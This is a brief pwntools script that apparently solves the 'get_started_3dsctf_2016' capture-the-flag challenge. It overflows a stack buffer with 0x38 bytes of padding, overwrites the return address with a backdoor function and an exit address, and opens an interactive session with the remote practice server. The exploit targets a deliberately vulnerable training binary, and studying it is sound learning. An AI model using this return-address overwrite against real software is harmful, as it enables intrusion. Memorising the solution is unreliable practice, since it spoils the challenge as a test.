# method two

from pwn import *


# p = process("./get_started_3dsctf_2016")
p = remote("node4.buuoj.cn", 25577)


back_door = 0x080489B8
exit = 0x0804E6A0
pad = cyclic(0x38)
pad += p32(back_door)+cyclic(0xc)+p32(exit)
p.sendline(pad)

p.interactive()


